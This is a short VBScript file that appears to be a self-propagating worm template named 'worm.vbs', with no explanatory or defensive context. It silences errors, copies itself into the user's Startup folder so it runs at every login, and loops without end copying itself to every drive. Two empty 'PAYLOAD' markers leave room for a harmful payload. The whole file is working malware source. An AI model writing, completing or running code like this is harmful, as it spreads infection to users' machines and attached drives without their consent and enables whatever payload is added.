on error resume next
scriptdir = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)
Set s = CreateObject( "WScript.Shell" )
Dim objFS
Set objFS = CreateObject("Scripting.FileSystemObject")
Set s = CreateObject( "WScript.Shell" )
'PAYLOAD

'PAYLOAD
dim user
user = s.ExpandEnvironmentStrings( "%Userprofile%" )
objFS.CopyFile scriptdir & "\worm.vbs", user & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\",false
Dim WshShell
Set WshShell = WScript.CreateObject("Wscript.Shell")
Set colDrives = objFS.Drives
do
For Each objDrive in colDrives
    objFS.CopyFile scriptdir & "\worm.vbs", objDrive.DriveLetter & ":\",false
Next
loop

